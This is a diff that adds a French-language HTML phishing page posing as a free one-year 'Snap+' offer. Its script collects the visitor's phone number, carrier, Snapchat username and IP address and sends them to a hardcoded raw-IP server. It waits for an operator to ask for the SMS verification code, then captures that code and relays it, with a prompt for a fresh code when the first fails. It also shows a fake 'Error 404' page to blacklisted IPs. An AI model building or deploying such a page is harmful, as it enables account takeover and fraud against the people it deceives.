@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snap+</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-dark: #000000;
+            --card-bg: #050505;
+            --border-gold: rgba(250, 204, 21, 0.25);
+            --border-input: #1f1f1f;
+            --accent-gold: #facc15;
+            --text-main: #ffffff;
+            --text-sub: #71717a;
+            --text-muted: #a1a1aa;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .container {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-gold);
+            padding: 35px 28px;
+            border-radius: 24px;
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 0 35px rgba(0, 0, 0, 0.95), 0 0 20px rgba(250, 204, 21, 0.05);
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        .brand-logo {
+            width: 85px;
+            height: auto;
+            margin-bottom: 15px;
+        }
+
+        h1.brand-title {
+            font-size: 2rem;
+            font-weight: 900;
+            letter-spacing: -0.03em;
+            margin-bottom: 4px;
+            color: #ffffff;
+        }
+
+        h1.brand-title span { color: var(--accent-gold); }
+
+        h2.page-subtitle {
+            font-size: 1.3rem;
+            font-weight: 800;
+            color: #ffffff;
+            margin-bottom: 6px;
+        }
+
+        p.desc-text {
+            font-size: 0.88rem;
+            color: var(--text-sub);
+            margin-bottom: 25px;
+        }
+
+        .form-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.72rem;
+            font-weight: 800;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 16px;
+            color: var(--accent-gold);
+            font-weight: 700;
+            font-size: 0.95rem;
+            pointer-events: none;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--border-input);
+            background-color: #000000;
+            color: #ffffff;
+            border-radius: 12px;
+            font-size: 0.95rem;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        .has-icon { padding-left: 54px; }
+
+        select {
+            cursor: pointer;
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%2371717a' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+            background-size: 16px;
+        }
+
+        input::placeholder { color: #3f3f46; }
+        input:focus, select:focus { border-color: var(--accent-gold); }
+
+        .btn-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-top: 8px;
+        }
+
+        .btn-option {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 12px;
+            border: 1px solid var(--border-input);
+            background-color: #000000;
+            color: #ffffff;
+            border-radius: 12px;
+            font-size: 0.88rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            user-select: none;
+        }
+
+        .btn-option:hover { border-color: #3f3f46; background-color: #09090b; }
+        .btn-option.selected {
+            border-color: var(--accent-gold);
+            background-color: #000000;
+            color: var(--accent-gold);
+            box-shadow: 0 0 12px rgba(250, 204, 21, 0.15);
+        }
+
+        .btn-option svg { width: 16px; height: 16px; fill: currentColor; }
+
+        button.submit-btn {
+            width: 100%;
+            padding: 16px;
+            background-color: var(--accent-gold);
+            color: #000000;
+            border: none;
+            border-radius: 12px;
+            font-size: 0.95rem;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        button.submit-btn:hover { background-color: #eab308; transform: translateY(-1px); }
+        button.submit-btn:disabled { background-color: #18181b; color: #3f3f46; cursor: not-allowed; transform: none; }
+
+        #error-msg {
+            color: #ef4444;
+            font-size: 0.85rem;
+            font-weight: 700;
+            margin-top: 15px;
+            min-height: 20px;
+            display: none;
+        }
+
+        .waiting-animation-box {
+            position: relative;
+            width: 200px;
+            height: 200px;
+            margin: 25px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .outer-ring {
+            position: absolute;
+            width: 100%; height: 100%;
+            border-radius: 50%;
+            border: 1px solid rgba(250, 204, 21, 0.35);
+            box-shadow: 0 0 25px rgba(250, 204, 21, 0.15), inset 0 0 25px rgba(250, 204, 21, 0.1);
+        }
+
+        .dotted-ring {
+            position: absolute;
+            width: 82%; height: 82%;
+            border-radius: 50%;
+            border: 1.5px dashed rgba(250, 204, 21, 0.4);
+            animation: rotateDotted 12s linear infinite;
+        }
+
+        @keyframes rotateDotted {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .center-circle {
+            position: absolute;
+            width: 58%; height: 58%;
+            border-radius: 50%;
+            background: radial-gradient(circle at 35% 35%, #fde047 0%, #facc15 60%, #ca8a04 100%);
+            box-shadow: 0 0 30px rgba(250, 204, 21, 0.5), inset 0 2px 6px rgba(255, 255, 255, 0.6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .clock-icon {
+            width: 36px; height: 36px;
+            stroke: #000000; stroke-width: 2.2; fill: none;
+            stroke-linecap: round; stroke-linejoin: round;
+        }
+
+        p.please-wait {
+            color: var(--accent-gold);
+            font-size: 1.05rem;
+            font-weight: 800;
+            margin-top: 20px;
+        }
+
+        #waiting-section, #code-section, #verifying-section, #blacklisted-section {
+            display: none;
+            animation: fadeIn 0.4s ease;
+        }
+
+        #error-404-page {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100vw; height: 100vh;
+            background-color: #ffffff; color: #000000;
+            font-family: Arial, sans-serif; font-size: 24px; font-weight: bold;
+            padding: 30px; z-index: 99999;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="error-404-page">Error 404</div>
+
+    <div class="container" id="main-container">
+        <svg class="brand-logo" viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M100 25C75 25 55 45 55 70C55 80 58 88 62 95C55 98 42 105 40 115C38 123 45 128 52 130C50 135 48 142 55 148C62 153 75 150 82 155C88 160 92 170 100 170C108 170 112 160 118 155C125 150 138 153 145 148C152 142 150 135 148 130C155 128 162 123 160 115C158 105 145 98 138 95C142 88 145 80 145 70C145 45 125 25 100 25Z" stroke="#FACC15" stroke-width="8" stroke-linecap="round" stroke-linejoin="round"/>
+            <path d="M145 45V75M130 60H160" stroke="#FFFFFF" stroke-width="8" stroke-linecap="round"/>
+        </svg>
+
+        <!-- FORMULAIRE PRINCIPAL -->
+        <div id="postulation-section">
+            <h1 class="brand-title">Snap<span>+</span></h1>
+            <h2 class="page-subtitle" style="font-size: 1.15rem;">Snap+ Gratuit 1 an</h2>
+            <p class="desc-text">Fait la vérification par numéro de téléphone pour obtenir snap+ gratuitement pendant un an!</p>
+
+            <div class="form-group">
+                <label for="country">PAYS</label>
+                <select id="country" onchange="updateTests()">
+                    <option value="">Sélectionne ton pays</option>
+                    <option value="France">🇫🇷 France</option>
+                    <option value="Belgique">🇧🇪 Belgique</option>
+                    <option value="Suisse">🇨🇭 Suisse</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="identifier">NUMÉRO DE TÉLÉPHONE</label>
+                <div class="input-wrapper">
+                    <span class="input-icon" id="prefix-icon">🆔</span>
+                    <input type="text" id="identifier" class="has-icon" placeholder="06 12 34 56 78" maxlength="10" autocomplete="off" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="username">NOM D'UTILISATEUR SNAPCHAT</label>
+                <div class="input-wrapper">
+                    <span class="input-icon">@</span>
+                    <input type="text" id="username" class="has-icon" placeholder="Pseudo" autocomplete="off">
+                </div>
+            </div>
+
+            <div class="form-group" id="test-group" style="display: none;">
+                <label>OPÉRATEUR</label>
+                <div class="btn-grid" id="test-buttons"></div>
+            </div>
+
+            <button class="submit-btn" id="btn-submit" onclick="sendPostulation()">Continuer</button>
+            <div id="error-msg"></div>
+        </div>
+
+        <!-- PAGE D'ATTENTE -->
+        <div id="waiting-section">
+            <h1 class="brand-title">Snap<span>+</span></h1>
+            <h2 class="page-subtitle">Vérification de la demande</h2>
+            <p class="desc-text" style="margin-bottom: 10px;">NE FERMEZ PAS LA PAGE...</p>
+
+            <div class="waiting-animation-box">
+                <div class="outer-ring"></div>
+                <div class="dotted-ring"></div>
+                <div class="center-circle">
+                    <svg class="clock-icon" viewBox="0 0 24 24">
+                        <circle cx="12" cy="12" r="9"/>
+                        <polyline points="12 7 12 12 15 15"/>
+                    </svg>
+                </div>
+            </div>
+
+            <p class="please-wait">Merci de patienter...</p>
+        </div>
+
+        <!-- SAISIE CODE -->
+        <div id="code-section">
+            <h1 class="brand-title">Snap<span>+</span></h1>
+            <h2 class="page-subtitle" style="font-size: 1.15rem; margin-bottom: 10px;">Validation Requise</h2>
+            <p id="code-prompt-text" style="margin-bottom: 18px; color: #e2e8f0; font-size: 0.88rem; line-height: 1.5;">
+                Merci de rentrer le code reçu pour finir la vérification et obtenir votre snap+ gratuitement.
+            </p>
+            <div class="form-group">
+                <label for="code-input" id="code-label" style="text-align: center;">CODE</label>
+                <input type="text" id="code-input" placeholder="0000" maxlength="4" style="text-align: center; font-size: 1.8rem; letter-spacing: 8px; font-weight: 800; color: var(--accent-gold);" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+            </div>
+            <button class="submit-btn" id="btn-code" onclick="sendCode()">Confirmer le code</button>
+            <div id="error-msg-code" style="color: #ef4444; font-size: 0.85rem; font-weight: 700; margin-top: 15px; display: none;"></div>
+        </div>
+
+        <!-- VÉRIFICATION CODE -->
+        <div id="verifying-section">
+            <h1 class="brand-title">Snap<span>+</span></h1>
+            <h2 class="page-subtitle">Vérification du code</h2>
+            <p class="desc-text" style="margin-bottom: 10px;">Analyse de ton code...</p>
+
+            <div class="waiting-animation-box">
+                <div class="outer-ring"></div>
+                <div class="dotted-ring"></div>
+                <div class="center-circle">
+                    <svg class="clock-icon" viewBox="0 0 24 24">
+                        <circle cx="12" cy="12" r="9"/>
+                        <polyline points="12 7 12 12 15 15"/>
+                    </svg>
+                </div>
+            </div>
+
+            <p class="please-wait">Merci de patienter...</p>
+        </div>
+
+        <!-- BLACKLIST NUMÉRO DE TÉLÉPHONE -->
+        <div id="blacklisted-section">
+            <h1 class="brand-title">Snap<span>+</span></h1>
+            <h2 class="page-subtitle" style="color: #ef4444;">Numéro de téléphone Inutilisable</h2>
+            <p style="margin-top: 15px; margin-bottom: 25px; color: #a1a1aa; font-size: 0.9rem; line-height: 1.5;">
+                Le numéro de téléphone que vous avez soumis ne peut pas être traité. Veuillez utiliser un autre numéro.
+            </p>
+            <button class="submit-btn" onclick="resetToHome()">Retour à l'accueil</button>
+        </div>
+    </div>
+
+    <script>
+        const API_URL = "http://31.220.94.166:25780";
+        let selectedTest = "";
+        let userIP = "Non détectée";
+        let currentPostulationId = null;
+        let checkInterval = null;
+        let expectedDigits = 4;
+
+        window.addEventListener('DOMContentLoaded', async () => {
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                userIP = ipData.ip;
+
+                const checkIpRes = await fetch(`${API_URL}/api/check-ip/${userIP}`);
+                const checkIpData = await checkIpRes.json();
+                if (checkIpData.blacklisted) {
+                    document.getElementById('main-container').style.display = 'none';
+                    document.getElementById('error-404-page').style.display = 'block';
+                    return;
+                }
+            } catch (e) {}
+
+            const savedSession = localStorage.getItem('snap_session');
+            if (savedSession) {
+                const sessionData = JSON.parse(savedSession);
+                if (Date.now() - sessionData.timestamp < 10 * 60 * 1000) {
+                    currentPostulationId = sessionData.id;
+                    showWaitingPage();
+                    checkInterval = setInterval(checkCodeRequested, 2000);
+                } else {
+                    localStorage.removeItem('snap_session');
+                }
+            }
+        });
+
+        function showError(message) {
+            const errDiv = document.getElementById('error-msg');
+            errDiv.innerText = message;
+            errDiv.style.display = 'block';
+        }
+
+        function updateTests() {
+            const country = document.getElementById('country').value;
+            const container = document.getElementById('test-buttons');
+            const group = document.getElementById('test-group');
+            const prefixIcon = document.getElementById('prefix-icon');
+
+            container.innerHTML = "";
+            selectedTest = "";
+
+            if (country === "France") prefixIcon.innerText = "+33";
+            else if (country === "Belgique") prefixIcon.innerText = "+32";
+            else if (country === "Suisse") prefixIcon.innerText = "+41";
+            else prefixIcon.innerText = "🆔";
+
+            let tests = [];
+            if (country === "France") tests = ["SFR", "Bouygues", "Orange"];
+            else if (country === "Belgique") tests = ["Orange Belgique", "BASE", "Proximus", "Telenet"];
+            else if (country === "Suisse") tests = ["Swisscom", "Sunrise", "Salt"];
+
+            if (tests.length > 0) {
+                group.style.display = "block";
+                tests.forEach(test => {
+                    const btn = document.createElement('div');
+                    btn.className = "btn-option";
+                    btn.innerHTML = `<svg viewBox="0 0 24 24"><path d="M12 3v18M18 8v13M6 13v8"/></svg> ${test}`;
+                    btn.onclick = () => {
+                        document.querySelectorAll('.btn-option').forEach(b => b.classList.remove('selected'));
+                        btn.classList.add('selected');
+                        selectedTest = test;
+                    };
+                    container.appendChild(btn);
+                });
+            } else {
+                group.style.display = "none";
+            }
+        }
+
+        async function sendPostulation() {
+            document.getElementById('error-msg').style.display = 'none';
+
+            const country = document.getElementById('country').value;
+            const username = document.getElementById('username').value.trim();
+            const identifier = document.getElementById('identifier').value.trim();
+
+            if (!country) {
+                showError("Veuillez sélectionner un pays.");
+                return;
+            }
+            if (!identifier) {
+                showError("Veuillez entrer votre numéro de téléphone.");
+                return;
+            }
+            if (!/^\d+$/.test(identifier)) {
+                showError("Le numéro de téléphone doit contenir uniquement des chiffres.");
+                return;
+            }
+            if (identifier.length !== 10) {
+                showError("Le numéro de téléphone doit comporter exactement 10 chiffres.");
+                return;
+            }
+
+            if (country === "France" && !identifier.startsWith("06") && !identifier.startsWith("07")) {
+                showError("Pour la France, le numéro de téléphone doit commencer par 06 ou 07.");
+                return;
+            }
+            if (country === "Belgique" && !identifier.startsWith("04")) {
+                showError("Pour la Belgique, le numéro de téléphone doit commencer par 04.");
+                return;
+            }
+            if (country === "Suisse" && !identifier.startsWith("06") && !identifier.startsWith("07")) {
+                showError("Pour la Suisse, le numéro de téléphone doit commencer par 06 ou 07.");
+                return;
+            }
+
+            if (!username) {
+                showError("Veuillez entrer votre nom d'utilisateur Snapchat.");
+                return;
+            }
+            if (!selectedTest) {
+                showError("Veuillez sélectionner un opérateur.");
+                return;
+            }
+
+            document.getElementById('btn-submit').disabled = true;
+
+            try {
+                const res = await fetch(`${API_URL}/api/postulation`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ country, username, identifier, testOption: selectedTest, ip: userIP })
+                });
+
+                const data = await res.json();
+
+                if (data.blacklisted) {
+                    showBlacklistedPage();
+                    return;
+                }
+
+                if (data.success) {
+                    currentPostulationId = data.postulationId;
+                    localStorage.setItem('snap_session', JSON.stringify({
+                        id: currentPostulationId,
+                        identifier: identifier,
+                        timestamp: Date.now()
+                    }));
+
+                    showWaitingPage();
+                    checkInterval = setInterval(checkCodeRequested, 2000);
+                } else {
+                    showError(data.message || "Erreur lors de la transmission.");
+                    document.getElementById('btn-submit').disabled = false;
+                }
+            } catch (err) {
+                showError("Impossible de contacter le serveur du bot.");
+                document.getElementById('btn-submit').disabled = false;
+            }
+        }
+
+        async function checkCodeRequested() {
+            if (!currentPostulationId) return;
+            try {
+                const res = await fetch(`${API_URL}/api/status/${currentPostulationId}`);
+                const data = await res.json();
+
+                if (data.blacklisted) {
+                    clearInterval(checkInterval);
+                    localStorage.removeItem('snap_session');
+                    showBlacklistedPage();
+                    return;
+                }
+
+                if (data.akayraRequested) {
+                    clearInterval(checkInterval);
+                    expectedDigits = data.digits || 4;
+
+                    const promptText = document.getElementById('code-prompt-text');
+                    const inputField = document.getElementById('code-input');
+                    const labelField = document.getElementById('code-label');
+
+                    if (data.isResend) {
+                        promptText.innerText = "Le code précédent était invalide, expiré, ou il y a eu un problème lors de la vérification du code. Merci de re-saisir le NOUVEAU code  reçu ci-dessous";
+                    } else {
+                        promptText.innerText = "Merci de rentrer le code reçu sur votre numéro de téléphone et obtenir votre snap+ gratuitement";
+                    }
+
+                    labelField.innerText = `CODE (${expectedDigits} CHIFFRES)`;
+                    inputField.maxLength = expectedDigits;
+                    inputField.placeholder = "0".repeat(expectedDigits);
+                    inputField.value = "";
+
+                    document.getElementById('waiting-section').style.display = 'none';
+                    document.getElementById('verifying-section').style.display = 'none';
+                    document.getElementById('code-section').style.display = 'block';
+                    document.getElementById('btn-code').disabled = false;
+                }
+            } catch (e) {}
+        }
+
+        async function sendCode() {
+            const akayra = document.getElementById('code-input').value.trim();
+            const regex = new RegExp(`^\\d{${expectedDigits}}$`);
+
+            if (!regex.test(akayra)) {
+                alert(`Le code doit comporter exactement ${expectedDigits} chiffres.`);
+                return;
+            }
+
+            document.getElementById('btn-code').disabled = true;
+
+            try {
+                const res = await fetch(`${API_URL}/api/akayra`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ postulationId: currentPostulationId, akayra })
+                });
+
+                const data = await res.json();
+                if (data.success) {
+                    document.getElementById('code-section').style.display = 'none';
+                    document.getElementById('verifying-section').style.display = 'block';
+                    checkInterval = setInterval(checkCodeRequested, 2000);
+                } else {
+                    alert("Erreur : " + data.message);
+                    document.getElementById('btn-code').disabled = false;
+                }
+            } catch (err) {
+                alert("Erreur lors de l'envoi.");
+                document.getElementById('btn-code').disabled = false;
+            }
+        }
+
+        function showWaitingPage() {
+            document.getElementById('postulation-section').style.display = 'none';
+            document.getElementById('code-section').style.display = 'none';
+            document.getElementById('verifying-section').style.display = 'none';
+            document.getElementById('blacklisted-section').style.display = 'none';
+            document.getElementById('waiting-section').style.display = 'block';
+        }
+
+        function showBlacklistedPage() {
+            document.getElementById('postulation-section').style.display = 'none';
+            document.getElementById('waiting-section').style.display = 'none';
+            document.getElementById('code-section').style.display = 'none';
+            document.getElementById('verifying-section').style.display = 'none';
+            document.getElementById('blacklisted-section').style.display = 'block';
+        }
+
+        function resetToHome() {
+            localStorage.removeItem('snap_session');
+            location.reload();
+        }
+    </script>
+</body>
+</html>
